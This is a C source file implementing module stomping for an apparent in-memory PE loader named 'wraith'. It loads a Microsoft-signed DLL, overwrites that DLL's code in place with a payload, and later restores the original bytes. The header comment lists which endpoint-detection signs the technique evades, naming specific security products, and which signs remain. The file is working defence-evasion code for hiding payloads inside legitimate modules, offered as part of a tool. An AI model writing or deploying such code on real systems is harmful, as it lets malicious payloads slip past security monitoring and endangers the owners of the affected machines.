/*
 * src/mapping/map_stomping.c
 *
 * Module Stomping mapping strategy.
 *
 * The technique:
 *  1. LoadLibraryW a Microsoft-signed host DLL whose SizeOfImage
 *  is >= our payload's aligned size. This puts the host in
 *  PEB.Ldr, runs its DllMain ATTACH, and gives us its real
 *  MEM_IMAGE base.
 *  2. Save a byte-exact backup of the first `payload_size` bytes
 *  of the host. We will restore these on free.
 *  3. Flip that range to PAGE_READWRITE.
 *  4. Hand the base to the loader. CopySections + relocations
 *  overwrite the host's bytes in place.
 *  5. ph_protect/FinalizeSections fixes up to our payload's
 *  intended per-section RX/R/RW.
 *  6. On wraith_free_library: restore the byte backup, re-derive the
 *  host's per-section protections from its in-image headers,
 *  then FreeLibrary so the host's DETACH path runs against an
 *  intact image.
 *
 * IOCs neutralised vs phantom hollowing:
 *  - The module is in PEB.Ldr automatically (no need for
 *  WRAITH_F_PEB_LINKAGE). Auto-masquerade under the host's name.
 *  - GetModuleHandleW(<host>) returns it.
 *  - RtlPcToFileHeader points to the host's name for any RIP in
 *  the stomped range.
 *
 * Residual IOCs vs phantom:
 *  - The host's `.text` is destroyed during the lifetime of the
 *  load. Any code in the process that calls into the host while
 *  stomped will crash. *Do not stomp DLLs that other modules in
 *  the process import.* The picker prefers loosely-coupled host
 *  candidates but the responsibility is on the consumer.
 *  - DLL hash verification (Cylance, ESET advanced) detects the
 *  modified `.text` against the on-disk hash.
 *
 * This strategy is documented as lab-only in WRAITH_USE_MODULE_STOMPING.
 */

#include "core/wr_context_internal.h"
#include "mapping/map_phantom_host_picker.h"
#include "mapping/map_strategy.h"
#include "wraith/wraith_options.h"
#include "pe/pe_constants.h"
#include "runtime/rt_api.h"

#include <stdlib.h>
#include <string.h>
#include <windows.h>

typedef struct stomping_state {
  HMODULE  host;  /* refcount-bearing handle to the host DLL */
  void  *base;  /* host's image base (== HMODULE on x64)  */
  size_t  range_size;  /* bytes covered by backup / restore  */
  void  *backup;  /* host's original bytes for [base..size)  */
  wchar_t  host_path[MAX_PATH];
} stomping_state;

static void reapply_host_section_protections(struct wr_ctx *ctx,
  void *base, size_t range)
{
  /* Walk the host's section table (still intact at the headers
  * area because we restored the backup just before). For each
  * section that falls inside our restored range, apply protection
  * derived from `Characteristics`. */
  PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
  if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
  return;
  }
  PIMAGE_NT_HEADERS64 nt =
  (PIMAGE_NT_HEADERS64)((uint8_t *)base + dos->e_lfanew);
  if (nt->Signature != IMAGE_NT_SIGNATURE) {
  return;
  }
  DWORD page = ctx->page_size ? ctx->page_size : 4096;

  PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);
  for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++s) {
  size_t va_off = s->VirtualAddress;
  size_t vsize  = s->Misc.VirtualSize ? s->Misc.VirtualSize
  : s->SizeOfRawData;
  if (vsize == 0 || va_off >= range) {
  continue;
  }
  size_t end = va_off + vsize;
  if (end > range) end = range;
  size_t actual = end - va_off;
  size_t rounded = (actual + page - 1) & ~(size_t)(page - 1);

  wraith_prot_t prot = wr_prot_from_section_chars(s->Characteristics);
  unsigned w32 = wr_prot_to_win32(prot);
  if (!w32) continue;
  unsigned old = 0;
  (void)ctx->rt_ops->nt_protect((uint8_t *)base + va_off,
  rounded, w32, &old);
  }
}

static wraith_status_t st_reserve(struct wr_ctx *ctx, size_t needed_size,
  void **out_base)
{
  if (!ctx || !out_base || !ctx->rt_ops) {
  return WRAITH_E_NULL_ARG;
  }

  stomping_state *st = (stomping_state *)calloc(1, sizeof(*st));
  if (!st) {
  return wr_ctx_fail(ctx, WRAITH_E_OOM, "stomping: alloc state");
  }

  /* Pick a host path. Reuse the phantom host picker - the criteria
  * (Microsoft-signed, large enough) are identical. */
  const wchar_t *preferred = ctx->phantom_host_path
  ? ctx->phantom_host_path
  : NULL;
  wraith_status_t rc = wr_phantom_pick_host(needed_size, preferred,
  st->host_path,
  sizeof(st->host_path) /
  sizeof(st->host_path[0]));
  if (rc != WRAITH_OK) {
  free(st);
  return wr_ctx_fail(ctx, WRAITH_E_MAP_NO_HOST_DLL,
  "stomping: no host DLL >= %zu bytes",
  needed_size);
  }

  /* LoadLibraryW pins the host in PEB.Ldr. Side effect: host's
  * DllMain runs ATTACH. */
  st->host = LoadLibraryW(st->host_path);
  if (!st->host) {
  free(st);
  return wr_ctx_fail(ctx, WRAITH_E_MAP_NO_HOST_DLL,
  "stomping: LoadLibraryW failed: 0x%08lx",
  (unsigned long)GetLastError());
  }
  st->base = (void *)st->host;

  /* Validate host's SizeOfImage at the loaded base. */
  PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)st->base;
  PIMAGE_NT_HEADERS64 nt =
  (PIMAGE_NT_HEADERS64)((uint8_t *)st->base + dos->e_lfanew);
  if (nt->OptionalHeader.SizeOfImage < needed_size) {
  FreeLibrary(st->host);
  free(st);
  return wr_ctx_fail(ctx, WRAITH_E_MAP_HOST_TOO_SMALL,
  "stomping: host SizeOfImage=%lu < payload=%zu",
  (unsigned long)nt->OptionalHeader.SizeOfImage,
  needed_size);
  }

  /* Snapshot the bytes we are about to overwrite. */
  st->backup = malloc(needed_size);
  if (!st->backup) {
  FreeLibrary(st->host);
  free(st);
  return wr_ctx_fail(ctx, WRAITH_E_OOM, "stomping: backup alloc");
  }
  memcpy(st->backup, st->base, needed_size);
  st->range_size = needed_size;

  /* Flip the entire payload range to PAGE_READWRITE so subsequent
  * memcpy + relocations write through. The original per-page
  * protections will be reasserted by FinalizeSections (for our
  * payload) and by reapply_host_section_protections (for restore). */
  unsigned old = 0;
  int prc = ctx->rt_ops->nt_protect(st->base, st->range_size,
  PAGE_READWRITE, &old);
  if (prc != 0) {
  free(st->backup);
  FreeLibrary(st->host);
  free(st);
  return wr_ctx_fail(ctx, WRAITH_E_MAP_PROTECT_FAILED,
  "stomping: bulk RW flip -> 0x%x",
  (unsigned)prc);
  }

  ctx->map_state  = st;
  ctx->stomp_target_module = st->host;
  ctx->stomp_target_text  = st->base;
  ctx->stomp_target_size  = st->range_size;
  ctx->stomp_backup  = st->backup;

  *out_base = st->base;
  return WRAITH_OK;
}

static wraith_status_t st_commit(struct wr_ctx *ctx, void *addr, size_t size,
  wraith_prot_t initial_prot)
{
  /* The bulk RW flip in st_reserve already covers the loader's
  * write phase. This commit hook is therefore a no-op for
  * ; kept for signature symmetry. */
  (void)ctx; (void)addr; (void)size; (void)initial_prot;
  return WRAITH_OK;
}

static wraith_status_t st_protect(struct wr_ctx *ctx, void *addr, size_t size,
  wraith_prot_t new_prot)
{
  if (!ctx || !addr || size == 0 || !ctx->rt_ops) {
  return WRAITH_E_NULL_ARG;
  }
  unsigned w32 = wr_prot_to_win32(new_prot);
  if (!w32) {
  return wr_ctx_fail(ctx, WRAITH_E_MAP_RWX_LEAK,
  "stomping: rejected RWX in protect");
  }
  unsigned old = 0;
  int rc = ctx->rt_ops->nt_protect(addr, size, w32, &old);
  if (rc != 0) {
  return wr_ctx_fail(ctx, WRAITH_E_MAP_PROTECT_FAILED,
  "stomping: NtProtect -> 0x%x", (unsigned)rc);
  }
  if (new_prot & (WRAITH_PROT_RX | WRAITH_PROT_RXC)) {
  ctx->rt_ops->nt_flush_icache(addr, size);
  }
  return WRAITH_OK;
}

static wraith_status_t st_release(struct wr_ctx *ctx)
{
  if (!ctx) {
  return WRAITH_E_NULL_ARG;
  }
  stomping_state *st = (stomping_state *)ctx->map_state;
  if (!st) {
  return WRAITH_OK;
  }

  /* (1) Make the range writable again so we can splat the backup. */
  unsigned old = 0;
  if (st->base && st->range_size > 0 && ctx->rt_ops) {
  (void)ctx->rt_ops->nt_protect(st->base, st->range_size,
  PAGE_READWRITE, &old);
  /* (2) Restore the host's original bytes. */
  if (st->backup) {
  memcpy(st->base, st->backup, st->range_size);
  }
  /* (3) Walk the (now-intact) host section table and apply
  * each section's intended protection so FreeLibrary's
  * DllMain DETACH executes from RX, .data is writable, etc. */
  reapply_host_section_protections(ctx, st->base, st->range_size);
  ctx->rt_ops->nt_flush_icache(st->base, st->range_size);
  }

  if (st->backup) {
  free(st->backup);
  st->backup = NULL;
  }

  if (st->host) {
  FreeLibrary(st->host);
  st->host = NULL;
  }
  return WRAITH_OK;
}

static void st_destroy(struct wr_ctx *ctx)
{
  if (!ctx) return;
  free(ctx->map_state);
  ctx->map_state = NULL;
}

const struct wr_map_ops wr_map_ops_stomping = {
  .name  = "module_stomping",
  .reserve = st_reserve,
  .commit  = st_commit,
  .protect = st_protect,
  .release = st_release,
  .destroy = st_destroy,
};
